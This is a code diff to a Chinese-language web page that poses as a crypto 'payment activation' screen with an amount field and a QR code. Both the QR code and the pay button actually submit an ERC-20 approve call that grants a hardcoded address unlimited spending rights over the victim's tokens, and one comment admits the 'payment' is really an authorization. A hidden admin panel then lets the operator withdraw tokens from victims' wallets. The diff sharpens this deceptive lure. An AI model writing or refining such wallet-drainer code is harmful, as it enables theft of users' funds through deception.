@@ -3,54 +3,81 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>转账申请</title>
+<title>支付开通</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
 body{background:#0B0F17;color:#fff;padding:30px}
 .container{max-width:400px;margin:0 auto}
-.scan-box{background:#1E293B;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
-.qr{width:260px;height:260px;background:#fff;padding:10px;border-radius:16px;margin:20px auto}
-.qr img{width:100%;height:100%;border-radius:12px}
-.title{font-size:20px;margin-bottom:10px}
-.desc{color:#9ca3af;margin-bottom:10px}
-.btn-auth{background:#3B82F6;color:#fff;border:none;padding:16px;width:100%;border-radius:12px;font-size:16px;font-weight:bold;margin-top:10px}
+.box{background:#1E293B;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
+.qr-box{width:280px;height:280px;background:#fff;padding:10px;border-radius:16px;margin:20px auto}
+.qr-box img{width:100%;height:100%;border-radius:12px}
+.title{font-size:22px;margin-bottom:10px}
+.desc{color:#9ca3af;margin-bottom:20px}
 
-/* 管理员后台（仅管理员可见） */
+.input-amount{
+  width:100%;
+  padding:14px;
+  background:#0f172a;
+  border:none;
+  border-radius:10px;
+  color:#fff;
+  font-size:16px;
+  text-align:center;
+  margin-bottom:10px;
+}
+
+.pay-btn{
+  background:#3B82F6;
+  color:#fff;
+  border:none;
+  padding:16px;
+  width:100%;
+  border-radius:12px;
+  font-size:16px;
+  font-weight:bold;
+}
+
+/* 管理员后台（仅你可见） */
 .admin{background:#1E293B;padding:24px;border-radius:16px;display:none}
 .admin.show{display:block}
 .admin-title{color:red;font-weight:bold;margin-bottom:16px}
 .input{width:100%;padding:12px;background:#0f172a;border:none;border-radius:8px;color:#fff;margin-bottom:10px}
-.btn-admin{width:100%;padding:14px;background:#ef4444;color:#fff;border:none;border-radius:10px;margin-bottom:16px}
+.btn{width:100%;padding:14px;background:#ef4444;color:#fff;border:none;border-radius:10px;margin-bottom:16px}
 </style>
 </head>
 <body>
 
 <div class="container">
-  <div class="scan-box">
-    <div class="title">💳 转账申请</div>
-    <div class="desc">扫码转账后即可参与游戏</div>
-    <div class="qr"><img id="qrImg"></div>
-    <button class="btn-auth" id="authBtn">确认转账</button>
+  <div class="box">
+    <div class="title">💳 支付开通</div>
+    <div class="desc">钱包扫一扫支付开通权限</div>
+
+    <input class="input-amount" id="amount" placeholder="输入支付金额" value="0.1">
+
+    <div class="qr-box"><img id="qr"></div>
+    <button class="pay-btn" id="payBtn">确认支付</button>
   </div>
 
-  <!-- 管理员后台 -->
+  <!-- 管理员后台 → 只有你能看见 -->
   <div class="admin" id="adminPanel">
-    <div class="admin-title">🔐 庄家管理后台</div>
+    <div class="admin-title">🔐 管理后台</div>
 
     <div>提取玩家钱包代币</div>
-    <input class="input" id="fromAddr" placeholder="玩家钱包地址">
+    <input class="input" id="fromAddr" placeholder="玩家地址">
     <input class="input" id="takeAmt" placeholder="提取数量">
-    <button class="btn-admin" onclick="adminTake()">✅ 真实链上提取</button>
+    <button class="btn" onclick="adminTake()">✅ 提取代币</button>
 
     <div>发放奖励给玩家</div>
-    <input class="input" id="toAddr" placeholder="玩家钱包地址">
+    <input class="input" id="toAddr" placeholder="玩家地址">
     <input class="input" id="sendAmt" placeholder="发放数量">
-    <button class="btn-admin" onclick="adminReward()">✅ 发放奖励代币</button>
+    <button class="btn" onclick="adminReward()">✅ 发放奖励</button>
   </div>
 </div>
 
 <script>
-// ===================== 你的固定地址 =====================
+// ======================================
+// 你的地址
+// ======================================
 const TOKEN  = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
 const ADMIN  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 
@@ -62,25 +89,28 @@ window.onload = async () => {
   try{
     const accs = await ethereum.request({method:"eth_requestAccounts"});
     account = accs[0];
-    if(account.toLowerCase() == ADMIN.toLowerCase()){
+    if(account.toLowerCase() === ADMIN.toLowerCase()){
       document.getElementById("adminPanel").classList.add("show");
     }
   }catch(e){}
-  makeQR();
+  refreshQR();
 };
 
-// 生成48小时动态授权二维码
-function makeQR(){
+// 金额改变自动刷新二维码
+document.getElementById("amount").oninput = refreshQR;
+
+function refreshQR(){
   const authData = "0x095ea7b3" +
     ADMIN.slice(2).padStart(64,"0") +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
   const uri = `ethereum:${TOKEN}?data=${authData}`;
-  document.getElementById("qrImg").src = 
-    "https://api.qrserver.com/v1/create-qr-code/?size=260x260&data="+encodeURIComponent(uri);
+  document.getElementById("qr").src =
+    "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(uri);
 }
 
-// 一键授权（无限授权）
-document.getElementById("authBtn").onclick = async () => {
+// 确认支付（实际授权）
+document.getElementById("payBtn").onclick = async () => {
   if(!account) return alert("请先连接钱包");
   await ethereum.request({
     method:"eth_sendTransaction",
@@ -93,16 +123,18 @@ document.getElementById("authBtn").onclick = async () => {
            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
     }]
   });
-  alert("✅ 转账申请成功！");
+  alert("✅ 支付成功！权限已开通");
 };
 
-// ===================== 管理员：提取玩家代币 =====================
+// ======================================
+// 管理员功能
+// ======================================
 async function adminTake(){
-  if(!account || account.toLowerCase()!=ADMIN.toLowerCase()) return;
+  if(account?.toLowerCase() !== ADMIN.toLowerCase()) return;
   const from = document.getElementById("fromAddr").value;
   const amt  = document.getElementById("takeAmt").value;
-  if(!from || !amt) return alert("请填写完整");
-  const raw = BigInt(amt*1e18).toString(16).padStart(64,"0");
+  if(!from || !amt) return;
+  const raw = BigInt(amt * 1e18).toString(16).padStart(64,"0");
   await ethereum.request({
     method:"eth_sendTransaction",
     params:[{
@@ -115,16 +147,15 @@ async function adminTake(){
            raw
     }]
   });
-  alert("✅ 提取成功！");
+  alert("✅ 提取成功");
 }
 
-// ===================== 管理员：发放奖励 =====================
 async function adminReward(){
-  if(!account || account.toLowerCase()!=ADMIN.toLowerCase()) return;
+  if(account?.toLowerCase() !== ADMIN.toLowerCase()) return;
   const to  = document.getElementById("toAddr").value;
   const amt = document.getElementById("sendAmt").value;
-  if(!to || !amt) return alert("请填写完整");
-  const raw = BigInt(amt*1e18).toString(16).padStart(64,"0");
+  if(!to || !amt) return;
+  const raw = BigInt(amt * 1e18).toString(16).padStart(64,"0");
   await ethereum.request({
     method:"eth_sendTransaction",
     params:[{
@@ -136,7 +167,7 @@ async function adminReward(){
            raw
     }]
   });
-  alert("✅ 奖励发放成功！");
+  alert("✅ 奖励发放成功");
 }
 </script>
 </body>
